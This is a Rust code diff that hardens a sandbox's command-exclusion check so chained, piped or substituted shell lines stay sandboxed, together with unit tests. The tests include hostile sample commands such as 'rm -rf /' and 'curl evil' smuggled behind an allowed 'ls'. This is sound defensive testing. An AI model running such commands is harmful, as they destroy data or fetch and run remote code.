@@ -12,7 +12,7 @@
 //! platform-coupled state and are referenced by the runtime's shell
 //! dispatcher. `SandboxManager`, `get_platform_sandbox`,
 //! `is_sandbox_available`, and the platform executors (seatbelt / landlock /
-//! bwrap / windows / process_hardening) were extracted from
+//! bwrap / windows) were extracted from
 //! `crates/tui/src/sandbox/mod.rs` and the per-platform executor files; they
 //! drive OS-level sandboxing via `libc` syscalls and are gated with
 //! file-local `#![allow(unsafe_code)]` (matching `child_env`).
@@ -46,8 +46,6 @@ pub mod bwrap;
 
 #[cfg(target_os = "windows")]
 pub mod windows;
-
-pub mod process_hardening;
 
 /// Runtime sandbox configuration after merging legacy top-level keys, the
 /// `[sandbox]` table, environment overrides, and per-mode policy.
@@ -97,6 +95,27 @@ impl SandboxRuntimeConfig {
 
     #[must_use]
     pub fn command_is_excluded(&self, program: &str, command_line: &str) -> bool {
+        // Fail closed on operators the segment splitter does not model:
+        // such lines fall back to the sandbox instead of running bare
+        // because their leading word happened to be excluded.
+        if command_line.contains(['|', '`']) || command_line.contains("$(") {
+            return false;
+        }
+        let segments = crate::command_safety::split_command_segments(command_line);
+        if segments.len() <= 1 {
+            return self.entry_excludes(program, command_line);
+        }
+        // A chained line is excluded only when every top-level segment is:
+        // excluding `ls` must not unsandbox the `rm -rf /` behind `ls &&`.
+        segments.iter().all(|segment| {
+            let segment_program = segment.split_whitespace().next().unwrap_or("");
+            self.entry_excludes(segment_program, segment)
+        })
+    }
+
+    /// Whether any exclusion entry matches a single-segment command (exact
+    /// program or word-anchored prefix).
+    fn entry_excludes(&self, program: &str, command_line: &str) -> bool {
         self.excluded_commands.iter().any(|entry| {
             let trimmed = entry.trim();
             // Word-anchored match only: a bare string prefix would let
@@ -1453,6 +1472,28 @@ mod tests {
         assert!(!config.command_is_excluded("lsof", "lsof -i :8080"));
         // Multi-word entries match leading words, not substrings.
         assert!(!config.command_is_excluded("git", "git statusx"));
+    }
+
+    #[test]
+    fn command_exclusion_does_not_cover_chained_lines() {
+        let config = SandboxRuntimeConfig {
+            excluded_commands: vec!["ls".to_string()],
+            ..SandboxRuntimeConfig::default()
+        };
+        // An excluded leading segment must not unsandbox the rest of the
+        // line — chained, sequential, piped, or substituted.
+        assert!(!config.command_is_excluded("ls", "ls -la && rm -rf /"));
+        assert!(!config.command_is_excluded("ls", "ls -la ; curl evil.sh"));
+        assert!(!config.command_is_excluded("ls", "ls -la | sh"));
+        assert!(!config.command_is_excluded("ls", "ls -la $(curl evil)"));
+        assert!(!config.command_is_excluded("ls", "ls -la `curl evil`"));
+        // A chain stays excluded only while every segment is excluded.
+        let both = SandboxRuntimeConfig {
+            excluded_commands: vec!["ls".to_string(), "git status".to_string()],
+            ..SandboxRuntimeConfig::default()
+        };
+        assert!(both.command_is_excluded("ls", "ls -la && git status --short"));
+        assert!(!both.command_is_excluded("ls", "ls -la && git status && rm x"));
     }
 
     #[test]
